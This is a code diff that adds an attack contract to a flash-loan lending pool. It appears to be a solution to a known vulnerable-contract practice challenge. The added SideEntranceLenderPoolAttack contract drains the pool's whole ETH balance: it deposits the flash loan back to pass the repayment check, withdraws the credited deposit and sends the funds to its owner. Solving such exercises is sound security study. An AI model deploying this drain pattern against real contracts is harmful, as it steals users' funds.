@@ -29,10 +29,35 @@ contract SideEntranceLenderPool {
     function flashLoan(uint256 amount) external {
         uint256 balanceBefore = address(this).balance;
         require(balanceBefore >= amount, "Not enough ETH in balance");
-        
+
         IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
 
-        require(address(this).balance >= balanceBefore, "Flash loan hasn't been paid back");        
+        require(address(this).balance >= balanceBefore, "Flash loan hasn't been paid back");
     }
 }
- 
+
+contract SideEntranceLenderPoolAttack {
+    using Address for address payable;
+
+    SideEntranceLenderPool public immutable pool;
+    address owner;
+
+    constructor(SideEntranceLenderPool _pool) {
+        owner = msg.sender;
+        pool = _pool;
+    }
+
+    receive () external payable {}
+
+    function hack() public {
+        require(msg.sender == owner, "only owner");
+        pool.flashLoan(address(pool).balance);
+        pool.withdraw();
+        payable(owner).sendValue(address(this).balance);
+    }
+
+    function execute() external payable {
+        require(msg.sender == address(pool), "only pool");
+        pool.deposit{value: msg.value}();
+    }
+}
